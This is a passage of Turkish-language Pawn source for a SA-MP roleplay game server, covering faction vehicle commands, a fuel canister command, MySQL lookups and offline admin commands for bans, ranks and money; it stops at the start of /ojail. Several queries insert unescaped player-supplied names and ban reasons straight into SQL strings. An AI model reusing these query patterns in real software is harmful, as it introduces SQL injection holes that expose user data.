forward HareketliDestek4(playerid);
public HareketliDestek4(playerid)
{
	/*if(playerid == INVALID_PLAYER_ID || (Birlik[Karakter[playerid][birlik]][ftip] != LSPD || !Karakter[playerid][isbasi]) || !Girdi[playerid])
	{
		foreach(new i : Player)
		{
			RemovePlayerMapIcon(i, playerid);
			KillTimer(DestekTimer2[playerid]);
			PDFDestek[playerid] = 0;
			FPDDestek[playerid] = 0;
			return 1;
		}
	}*/
	new Float:DX, Float:DY, Float:DZ;
	GetPlayerPos(playerid, DX, DY, DZ);
	foreach(new i : Player)
	{
		if((Birlik[Karakter[i][birlik]][ftip] == LSFD && Karakter[i][fdisbasi] == 1))
	    {
	    	RemovePlayerMapIcon(i, playerid);
	        if(Birlik[Karakter[playerid][birlik]][ftip] == LSFD) SetPlayerMapIcon(i, playerid, DX, DY, DZ, 0, COLOR_YELLOW, MAPICON_GLOBAL);
		}
	}
	return DestekTimer4[playerid] = SetTimerEx("HareketliDestek4", 1000, false, "u", playerid);
}

forward DovusOgren(playerid, did);
public DovusOgren(playerid, did)
{
	switch(did)
	{
	    case 5:
	    {
	        //Bilgi(playerid, "Box dersi bitti. 3 gün sonra tekrar katýlabilirsiniz.");
	        Karakter[playerid][box]++;
	        if(Karakter[playerid][box] == 3) Bilgi(playerid, "Box dövüþ stili öðrendiniz.");
	    }
		case 6:
		{
		    //Bilgi(playerid, "KungFu dersi bitti. 3 gün sonra tekrar katýlabilirsiniz.");
		    Karakter[playerid][kungfu]++;
		    if(Karakter[playerid][kungfu] == 3) Bilgi(playerid, "KungFu dövüþ stili öðrendiniz.");
		}
		case 7:
		{
		    //Bilgi(playerid, "KneeHead dersi bitti. 3 gün sonra tekrar katýlabilirsiniz.");
		    Karakter[playerid][kneehead]++;
		    if(Karakter[playerid][kneehead] == 3) Bilgi(playerid, "KneeHead dövüþ stili öðrendiniz.");
		}
		case 15:
		{
		    //Bilgi(playerid, "GrabKick dersi bitti. 3 gün sonra tekrar katýlabilirsiniz.");
		    Karakter[playerid][grabkick]++;
		    if(Karakter[playerid][grabkick] == 3) Bilgi(playerid, "GrabKick dövüþ stili öðrendiniz.");
		}
		case 16:
		{
		    //Bilgi(playerid, "Elbow dersi bitti. 3 gün sonra tekrar katýlabilirsiniz.");
		    Karakter[playerid][elbow]++;
		    if(Karakter[playerid][elbow] == 3) Bilgi(playerid, "Elbow dövüþ stili öðrendiniz.");
		}
	}
	Ipucu(playerid, "Dövüþ stilinizi /dovusstil komutuyla deðiþtirebilirsiniz.");
}

CMD:beanbag(playerid, params[])
{
    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPA || (Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi]) || Birlik[Karakter[playerid][birlik]][ftip] == FBI)
	{
	    if(!IsPlayerInAnyVehicle(playerid) || Arac[GetPlayerVehicleID(playerid)][abirliktip] != LSPD) return Hata(playerid, "Bu komutu kullanmak için araç içerisinde olmalýsýnýz.");
	    if(GetPVarInt(playerid, "BeanBag") == 0)
		{
		    Bilgi(playerid, "Beanbagi elinize aldýnýz.");
		    MeGonder(playerid, 30.0, "beanbag silahýný araçtan alýr.");
		    RemovePlayerWeapon(playerid, 25);
		    GivePlayerWeapon(playerid, 25, 10);
		    SilahKullaniyor[playerid] = 1;
		    SetPVarInt(playerid, "BeanBag", 1);
		}
		else
		{
		    Bilgi(playerid, "Beanbagi býraktýnýz.");
		    MeGonder(playerid, 30.0, "beanbag silahýný araca býrakýr.");
		    RemovePlayerWeapon(playerid, 25);
		    SilahKullaniyor[playerid] = 0;
		    DeletePVar(playerid, "BeanBag");
		}
	}
	else Hata(playerid, "Ýþbaþýnda deðilsiniz.");
	return 1;
}

CMD:id(playerid, params[])
{
    new name[MAX_PLAYER_NAME], string[256];
	if(IsNumeric(params))
	{
	    new _pid = strval(params);
	    if(!IsPlayerConnected(_pid)) return Hata(playerid, "Oyuncu oyuna baðlý deðil.");
		format(string,sizeof(string),"%s(%d)",Isim(_pid), _pid);
		Ipucu(playerid,string);
		return 1;
	}
	if(sscanf(params, "s[24]", name)) return Kullanim(playerid,"/id [isim/id]");
	new count = 0;
    new playername[MAX_PLAYER_NAME];
    foreach(new i : Player)
    {
        if(IsPlayerConnected(i))
        {
            GetPlayerName(i, playername, MAX_PLAYER_NAME);
            if(strfind(playername, name, true) != -1)
            {
                if(count == 0)
                {
	                format(string,sizeof(string),"%s(%d)",playername, i);
					Ipucu(playerid,string);
                    count++;
                    continue;
                }
                count++;
                format(string,sizeof(string),"%s(%d)",playername, i);
				Ipucu(playerid,string);
            }
        }
    }
    if(count == 0) return Hata(playerid, "Kiþi bulunamadý, emin olmak için daha uzun karakter girin.");
    return 1;
}

CMD:pdtamir(playerid, params[])
{
	if(Birlik[Karakter[playerid][birlik]][ftip] != LSPD || !Girdi[playerid]) return 1;
	if(!IsPlayerInRangeOfPoint(playerid, 15, 1543.6100,-1706.7184,5.8906) && !IsPlayerInRangeOfPoint(playerid, 30, 2110.9983,-2430.0818,13.5469)) return Hata(playerid, "LSPD garajýnda deðilsiniz.");
	if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Aracýn içerisinde deðilsiniz.");
	new vid=GetPlayerVehicleID(playerid);
	if(Arac[vid][abirliktip] != LSPD) return Hata(playerid, "Bu aracý tamir edemezsiniz.");
	Aractamiri(vid);
	Bilgi(playerid, "Aracý tamir ettiniz.");
	return 1;
}
CMD:pdspawn(playerid, params[])
{
    if(Birlik[Karakter[playerid][birlik]][ftip] != LSPD || !Girdi[playerid]) return 1;
	if(!IsPlayerInRangeOfPoint(playerid, 10, 1543.6100,-1706.7184,5.8906)) return Hata(playerid, "LSPD garajýnda deðilsiniz.");
	if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Aracýn içerisinde deðilsiniz.");
	new vid=GetPlayerVehicleID(playerid);
	if(Arac[vid][abirliktip] != LSPD) return Hata(playerid, "Bu aracý spawn edemezsiniz.");
	RemovePlayerFromVehicle(playerid);
	SetVehicleToRespawn(vid);
	Aractamiri(vid);
	Bilgi(playerid, "Aracý spawn ettiniz.");
	return 1;
}
CMD:mdtamir(playerid, params[])
{
	if(Birlik[Karakter[playerid][birlik]][ftip] !=ASMS || !Girdi[playerid]) return 1;
	if(!IsPlayerInRangeOfPoint(playerid, 15, 293.8202,-1528.9287,24.5947)) return Hata(playerid, "LSMD garajýnda deðilsiniz.");
	if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Aracýn içerisinde deðilsiniz.");
	new vid=GetPlayerVehicleID(playerid);
	if(Arac[vid][abirliktip] != ASMS) return Hata(playerid, "Bu aracý tamir edemezsiniz.");
	RepairVehicle(vid);
	Bilgi(playerid, "Aracý tamir ettiniz.");
	return 1;
}
CMD:mdspawn(playerid, params[])
{
    if(Birlik[Karakter[playerid][birlik]][ftip] != ASMS || !Girdi[playerid]) return 1;
	if(!IsPlayerInRangeOfPoint(playerid, 15, 293.8202,-1528.9287,24.5947)) return Hata(playerid, "LSMD garajýnda deðilsiniz.");
	if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Aracýn içerisinde deðilsiniz.");
	new vid=GetPlayerVehicleID(playerid);
	if(Arac[vid][abirliktip] != ASMS) return Hata(playerid, "Bu aracý spawn edemezsiniz.");
	RemovePlayerFromVehicle(playerid);
	SetVehicleToRespawn(vid);
	Aractamiri(vid);
	Bilgi(playerid, "Aracý spawn ettiniz.");
	return 1;
}

CMD:fdtamir(playerid, params[])
{
	if(Birlik[Karakter[playerid][birlik]][ftip] !=LSFD || !Girdi[playerid]) return 1;
	if(!IsPlayerInRangeOfPoint(playerid, 10, 1105.8485,-1312.2449,13.6663)) return Hata(playerid, "LSFD garajýnda deðilsiniz.");
	if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Aracýn içerisinde deðilsiniz.");
	new vid=GetPlayerVehicleID(playerid);
	if(Arac[vid][abirliktip] != LSFD) return Hata(playerid, "Bu aracý tamir edemezsiniz.");
	RepairVehicle(vid);
	Bilgi(playerid, "Aracý tamir ettiniz.");
	return 1;
}
CMD:fdspawn(playerid, params[])
{
    if(Birlik[Karakter[playerid][birlik]][ftip] != LSFD || !Girdi[playerid]) return 1;
	if(!IsPlayerInRangeOfPoint(playerid, 10, 1105.8485,-1312.2449,13.6663)) return Hata(playerid, "LSFD garajýnda deðilsiniz.");
	if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Aracýn içerisinde deðilsiniz.");
	new vid=GetPlayerVehicleID(playerid);
	if(Arac[vid][abirliktip] != LSFD) return Hata(playerid, "Bu aracý spawn edemezsiniz.");
	RemovePlayerFromVehicle(playerid);
	SetVehicleToRespawn(vid);
	Aractamiri(vid);
	Bilgi(playerid, "Aracý spawn ettiniz.");
	return 1;
}

stock mysqlIsim(playerid)
{
	new __name[MAX_PLAYER_NAME+2];
	GetPlayerName(playerid, __name, sizeof(__name));
	strreplace(__name, "_", " ");
	return __name;
}

CMD:bidon(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(Karakter[playerid][bidon] != 1) return Hata(playerid, "Üzerinizde benzin bidonu bulunmamaktadýr.");
	new nstring[16],Float:_benzin=0.0;
	if(isnull(params)) return Kullanim(playerid, "/bidon [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: benzindoldur, aracdoldur, bilgi");
	sscanf(params,"s[16]f",nstring,_benzin);
	if(Buysa(nstring, "benzindoldur"))
	{
	    if(!Benzinistasyonunda(playerid)) return Hata(playerid, "Bir benzin istasyonunda deðilsiniz ya da bulunduðunuz istasyon kapalý durumda.");
	    if(_benzin < 1) return Kullanim(playerid, "/bidon benzindoldur [benzin] (Ücret:2xlt)");
		if(_benzin+Karakter[playerid][benzinbidon] > 200) return Hata(playerid, "Bidonun kapasitesini aþýyorsunuz.");
		if(Karakter[playerid][benzinbidon] >= 200) return Hata(playerid, "Bidonu zaten doldurdunuz.");
		if(GetPlayerCash(playerid) < floatround(_benzin*2)) return Hata(playerid, "Üzerinizde yeterli para bulunmamaktadýr.");
		Karakter[playerid][benzinbidon] += _benzin;
		Bilgi(playerid, "Bidona benzin doldurdunuz.");
		GivePlayerCash(playerid, -floatround(_benzin*2));
	}
	else if(Buysa(nstring,"aracdoldur"))
	{
	    if(IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Benzin doldurmak için araçtan inmeniz gerekmektedir.");
	    new vid=GetNearestVehicle(playerid);
	    if(vid == INVALID_VEHICLE_ID || IsABike(vid)) return Hata(playerid, "Aracýn yakýnýnda deðilsiniz.");
	    if(_benzin < 1 || _benzin > Karakter[playerid][benzinbidon]) return Kullanim(playerid, "/bidon aracdoldur [benzin]");
	    if(Arac[vid][abenzin]+_benzin > 100) return Hata(playerid, "Araca bu kadar benzin dolduramazsýnýz.");
	    Arac[vid][abenzin] += _benzin;
		Karakter[playerid][benzinbidon] -= _benzin;
		Bilgi(playerid, "Araca benzin doldurdunuz.");
	}
	else if(Buysa(nstring,"bilgi"))
	{
	    SendClientMessageEx(playerid, -1, "{B3B3B3}[BENZÝN BÝDON] "C1"Kalan litre: %.2flt", Karakter[playerid][benzinbidon]);
	}
	else return Kullanim(playerid, "/bidon [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: benzindoldur, aracdoldur, bilgi");
	return 1;
}

AracSayiKontrol(playerid)
{
	new __sayi=0, Float:pPos[3];
	GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
	for(new i;i<MAX_VEHICLES;i++)
	{
	    if(!IsValidVehicle(i)) continue;
	    if(IsVehicleInRangeOfPoint(i, 4.5, pPos[0], pPos[1], pPos[2]) && GetPlayerVirtualWorld(playerid) == GetVehicleVirtualWorld(i))
		{
			__sayi++;
		}
	}
	if(__sayi == 1) return 1;
	return 0;
}

IsimKontrol(_name[])
{
    new query[1024], __name[32];
    format(__name, sizeof(__name), "%s", _name);
    //strreplace(__name, "_", " ");
	format(query, sizeof(query), "SELECT * FROM `karakterler` WHERE `isim` = '%s'", __name);
	new Cache:cache = mysql_query(query,true);
	if (!cache_get_row_count())
	{
	    cache_delete(cache);
		return 0;
	}
	else
	{
	    new rows, fields;
	    cache_get_data(rows, fields, g_iHandle);
		new intid;
		intid = cache_get_field_content_int(0, "id");
	    cache_delete(cache);
		return intid;
	}
}

EhliyetNoKontrol(playerid)
{
	new query[128];
    format(query, sizeof(query), "SELECT * FROM `karakterler` WHERE `id` = '%d'", Karakter[playerid][sqlid]);
    new Cache:cache = mysql_query(query,true);
    if (!cache_get_row_count()) return 0;
	new rows, fields, _eno;
	cache_get_data(rows, fields, g_iHandle);
	_eno = cache_get_field_content_int(0,"ehliyetno");
	cache_delete(cache);
	if(_eno == 0) return 0;
	return 1;
}

RozetNoKontrol(playerid)
{
	new query[128];
    format(query, sizeof(query), "SELECT * FROM `karakterler` WHERE `id` = '%d'", Karakter[playerid][sqlid]);
    new Cache:cache = mysql_query(query,true);
    if (!cache_get_row_count()) return 1;
	static rows, fields, _rno, _bno, _cno, _ano;
	cache_get_data(rows, fields, g_iHandle);
	_rno = cache_get_field_content_int(0,"rozetno");
	_bno = cache_get_field_content_int(0,"birlik");
	_cno = cache_get_field_content_int(0,"ciu");
	_ano = cache_get_field_content_int(0,"avukat");
	cache_delete(cache);
	if(_bno == 1 && _rno == 0) return 0;
	if(_cno == 1 && _rno == 0) return 0;
	if(_ano > 1 && _rno == 0) return 0;
	return 1;
}

DilKontrolEx(playerid)
{
	new query[128];
    format(query, sizeof(query), "SELECT * FROM `karakterler` WHERE `id` = '%d'", Karakter[playerid][sqlid]);
    new Cache:cache = mysql_query(query,true);
    if (!cache_get_row_count()) return 1;
	new rows, fields, _dil;
	cache_get_data(rows, fields, g_iHandle);
	_dil = cache_get_field_content_int(0,"dil");
	cache_delete(cache);
	if(_dil == -1) return 0;
	return 1;
}

SQLNick(_sqlid)
{
	new query[128], _nick[32];
    format(query, sizeof(query), "SELECT * FROM `karakterler` WHERE `id` = '%d'", _sqlid);
    new Cache:cache = mysql_query(query,true);
    //if (!cache_get_row_count()) return "Yok";
	new rows, fields;
	cache_get_data(rows, fields, g_iHandle);
	cache_get_field_content(0,"Nickname",_nick);
	cache_delete(cache);
	return _nick;
}

/*NickKontrolEx(playerid)
{
	new query[128], _nick[32];
    format(query, sizeof(query), "SELECT * FROM `karakterler` WHERE `id` = '%d'", Karakter[playerid][sqlid]);
    new Cache:cache = mysql_query(query,true);
    if (!cache_get_row_count()) return 1;
	new rows, fields;
	cache_get_data(rows, fields, g_iHandle);
	cache_get_field_content(0,"Nickname",_nick);
	cache_delete(cache);
	if(Buysa(_nick,"Yok")) return 1;
	return 1;
}*/

BalikFiyatCek()
{
	new query[128], balikfiyat;
    format(query, sizeof(query), "SELECT * FROM `veriler` LIMIT 1");
    new Cache:cache = mysql_query(query,true);
	new rows, fields;
	cache_get_data(rows, fields, g_iHandle);
	balikfiyat = cache_get_field_content_int(0,"balikfiyat");
	cache_delete(cache);
	return balikfiyat;
}

NickCek(_sqlid)
{
	new query[128], _nick[32];
    format(query, sizeof(query), "SELECT * FROM `karakterler` WHERE `id` = '%d'", _sqlid);
    new Cache:cache = mysql_query(query,true);
    //if (!cache_get_row_count()) return "Yok";
	new rows, fields;
	cache_get_data(rows, fields, g_iHandle);
	cache_get_field_content(0,"Nickname",_nick);
	cache_delete(cache);
	return _nick;
}

NickKontrol(_nick[])
{
	new query[128];
    format(query, sizeof(query), "SELECT * FROM `karakterler` WHERE `Nickname` = '%s'", _nick);
    new Cache:cache = mysql_query(query,true);
	if(!cache_get_row_count())
	{
		cache_delete(cache);
		return 1;
	}
	cache_delete(cache);
	return 0;
}

CMD:oban(playerid, params[])
{
	if(Karakter[playerid][adminlevel] < 2 || !Girdi[playerid]) return 1;
	new _name[32], _sebep[32];
	if(sscanf(params,"s[32]s[32]",_name,_sebep)) return Kullanim(playerid, "/oban [Isim] [Sebep]");
	foreach(new i : Player)
	{
	    if(Buysa(Isim(i),_name))
	    {
	        Hata(playerid, "Oyuncu zaten oyunda.");
	        return 1;
	    }
	}
	new _sqlid = IsimKontrol(_name);
	if(_sqlid == 0) return Hata(playerid, "Bu isimde oyuncu bulunmamaktadýr.");
	new query[1024];
	new mtext[20],mstring[512];
	new year, month,day;
	getdate(year, month, day);
	if(month == 1) { mtext = "Ocak"; }
	else if(month == 2) { mtext = "Subat"; }
	else if(month == 3) { mtext = "Mart"; }
	else if(month == 4) { mtext = "Nisan"; }
	else if(month == 5) { mtext = "Mayis"; }
	else if(month == 6) { mtext = "Haziran"; }
	else if(month == 7) { mtext = "Temmuz"; }
	else if(month == 8) { mtext = "Agustos"; }
	else if(month == 9) { mtext = "Eylul"; }
	else if(month == 10) { mtext = "Ekim"; }
	else if(month == 11) { mtext = "Kasim"; }
	else if(month == 12) { mtext = "Aralik"; }
	new hour,minuite,second;
	gettime(hour,minuite,second);
	format(mstring, sizeof(mstring), "Tarih:[%d %s %d] - Saat:[%d:%d]", day,mtext,year,hour,minuite);
	format(query, sizeof(query), "INSERT INTO `banlistesi` (`ad`, `neden`, `yasaklayan`, `tarih`) VALUES ('%s', '%s', '%s', '%s')", _name, _sebep, Karakter[playerid][anick], mstring);
	mysql_tquery(1,query);
	new nstring[38];
	format(nstring, sizeof(nstring),"%sBAN",NickCek(_sqlid));//DUZENLE
	format(query, sizeof(query), "UPDATE `karakterler` SET `kilit` = '1', `neden` = '%s', `Nickname` = '%s' WHERE `id` = '%d'", _sebep, nstring,_sqlid);
	mysql_tquery(1,query);
	//format(query, sizeof(query), "INSERT INTO `bkarakterler` SElECT * FROM `karakterler` WHERE `id` = '%d'",_sqlid);
	//mysql_tquery(1,query);
	Bilgi(playerid, "Oyuncunun hesabýný kilitlediniz.");
	format(mstring, sizeof(mstring), "(( %s sunucudan yasaklandý. Sebep: %s %d/%s%d/%s%d - %s%d:%s%d ))", _name, _sebep, day, ((month < 10) ? ("0") : ("")), month, (year < 10) ? ("0") : (""), year, (hour < 10) ? ("0") : (""), hour, (minuite < 10) ? ("0") : (""), minuite);
	SendClientMessageToAll(COLOR_RED, mstring);
	return 1;
}
CMD:ock(playerid, params[])
{
	if(Karakter[playerid][adminlevel] < 1 || !Girdi[playerid]) return 1;
	new _name[32];
	if(sscanf(params,"s[32]",_name)) return Kullanim(playerid, "/ock [Isim]");
	foreach(new i : Player)
	{
	    if(Buysa(Isim(i),_name))
	    {
	        Hata(playerid, "Oyuncu zaten oyunda.");
	        return 1;
	    }
	}
	new _sqlid = IsimKontrol(_name);
	if(_sqlid == 0) return Hata(playerid, "Bu isimde oyuncu bulunmamaktadýr.");
	new query[1024];
	new mtext[20],mstring[512];
	new year, month,day;
	getdate(year, month, day);
	if(month == 1) { mtext = "Ocak"; }
	else if(month == 2) { mtext = "Subat"; }
	else if(month == 3) { mtext = "Mart"; }
	else if(month == 4) { mtext = "Nisan"; }
	else if(month == 5) { mtext = "Mayis"; }
	else if(month == 6) { mtext = "Haziran"; }
	else if(month == 7) { mtext = "Temmuz"; }
	else if(month == 8) { mtext = "Agustos"; }
	else if(month == 9) { mtext = "Eylul"; }
	else if(month == 10) { mtext = "Ekim"; }
	else if(month == 11) { mtext = "Kasim"; }
	else if(month == 12) { mtext = "Aralik"; }
	new hour,minuite,second;
	gettime(hour,minuite,second);
	format(mstring, sizeof(mstring), "Tarih:[%d %s %d] - Saat:[%d:%d]", day,mtext,year,hour,minuite);
	format(query, sizeof(query), "UPDATE `karakterler` SET `ck` = '1' WHERE `id` = '%d'", _sqlid);
	mysql_tquery(1,query);
	//format(query, sizeof(query), "INSERT INTO `bkarakterler` SElECT * FROM `karakterler` WHERE `id` = '%d'",_sqlid);
	//mysql_tquery(1,query);
	Bilgi(playerid, "Oyuncunun hesabýný ckladýnýz.");
	format(mstring, sizeof(mstring), "(( %s sunucudan yasaklandý. Sebep: Karakter Ölümü %d/%s%d/%s%d - %s%d:%s%d ))", _name, day, ((month < 10) ? ("0") : ("")), month, (year < 10) ? ("0") : (""), year, (hour < 10) ? ("0") : (""), hour, (minuite < 10) ? ("0") : (""), minuite);
	SendClientMessageToAll(COLOR_RED, mstring);
	return 1;
}
CMD:orutbever(playerid, params[])
{
			if(!BirlikYetkili(playerid) && Karakter[playerid][sqlid] != Birlik[Karakter[playerid][birlik]][blider]) return Hata(playerid, "Birlik yetkilisi deðilsiniz.");
			new _name[MAX_PLAYER_NAME+2], _rutbe;
			new mstring[128];
			if(sscanf(params,"s[32]d",_name,_rutbe)) return Kullanim(playerid, "/orutbever [Isim_Soyisim] [Rütbe]");
            foreach(new i : Player)
			{
			    if(Buysa(Isim(i),_name))
			    {
					if(Karakter[i][birlik] != Karakter[playerid][birlik]) return Hata(playerid, "Oyuncu sizin birliðinizde bulunmamaktadýr.");
			        if(Karakter[birlik][rutbe] >= Karakter[i][rutbe]) return Hata(playerid, "Bu oyuncuyu birliðinizden çýkartamazsýnýz.");
			        if(0 > _rutbe || _rutbe > 20) return Hata(playerid, "Rütbelendirme 1-20 arasýnda olmalýdýr.");
			        Karakter[i][rutbe] = _rutbe;
			        //strreplace(_name, "_", " ");
			        switch(_rutbe)
					{
					    case 1:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe1]);
					    case 2:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe2]);
					    case 3:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe3]);
					    case 4:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe4]);
					    case 5:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe5]);
					    case 6:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe6]);
					    case 7:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe7]);
					    case 8:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe8]);
					    case 9:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe9]);
					    case 10:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe10]);
		                case 11:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe11]);
		                case 12:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe12]);
		                case 13:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe13]);
		                case 14:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe14]);
		                case 15:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe15]);
		                case 16:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe16]);
		                case 17:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe17]);
		                case 18:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe18]);
		                case 19:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe19]);
		                case 20:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe20]);
					}
					Bilgi(playerid, mstring);
			    	if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD) LSPDGonder(mstring);
			    	else BirlikGonder(playerid,mstring);
			        return 1;
			    }
			}
			new _id = BirlikKontrol(_name, playerid);
			if(_id == 1)
			{
			    if(0 > _rutbe || _rutbe > 20) return Hata(playerid, "Rütbelendirme 1-20 arasýnda olmalýdýr.");
				new query[128];
				format(query, sizeof(query), "UPDATE `karakterler` SET `rutbe` = '%d' WHERE `isim` = '%s'",_rutbe,_name);
				mysql_tquery(1, query);
				switch(_rutbe)
				{
					case 1:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe1]);
					case 2:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe2]);
					case 3:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe3]);
					case 4:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe4]);
					case 5:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe5]);
					case 6:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe6]);
					case 7:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe7]);
					case 8:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe8]);
					case 9:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe9]);
					case 10:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe10]);
		            case 11:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe11]);
		            case 12:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe12]);
		            case 13:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe13]);
		            case 14:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe14]);
		            case 15:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe15]);
		            case 16:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe16]);
		            case 17:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe17]);
		            case 18:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe18]);
		            case 19:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe19]);
		        	case 20:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", _name, Birlik[Karakter[playerid][birlik]][rutbe20]);
				}
				Bilgi(playerid, mstring);
       			if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD) LSPDGonder(mstring);
       			else BirlikGonder(playerid,mstring);
			}
			else if(_id == 2) return Hata(playerid, "Hatalý bir rütbe belirliyorsunuz.");
			else if(_id == 3) return Hata(playerid, "Oyuncu sizin birliðinizde bulunmamaktadýr.");
			else if(_id == 4) return Hata(playerid, "Bu isimde bir oyuncu bulunmamaktadýr.");
			return 1;
}
CMD:oparaver(playerid, params[])
{
	if(Karakter[playerid][adminlevel] < 3 || !Girdi[playerid]) return 1;
	new _name[32], miktar;
	if(sscanf(params,"s[32]d",_name,miktar)) return Kullanim(playerid, "/oparaver [Isim] [para]");
	foreach(new i : Player)
	{
	    if(Buysa(Isim(i),_name))
	    {
	        Hata(playerid, "Oyuncu zaten oyunda.");
	        return 1;
	    }
	}
	new _sqlid = IsimKontrol(_name);
	if(_sqlid == 0) return Hata(playerid, "Bu isimde oyuncu bulunmamaktadýr.");
	new query[1024];
	new mstring[1024];
	format(query, sizeof(query), "UPDATE `karakterler` SET `para` = para+%d WHERE `id` = '%d'", miktar, _sqlid);
	mysql_tquery(1,query);
	format(mstring, sizeof(mstring), "[!] %s isimli oyuncuya %d miktar para verilmiþtir.", _name, miktar);
	Bilgi(playerid, mstring);
	return 1;
}

CMD:ojail(playerid, params[])
{
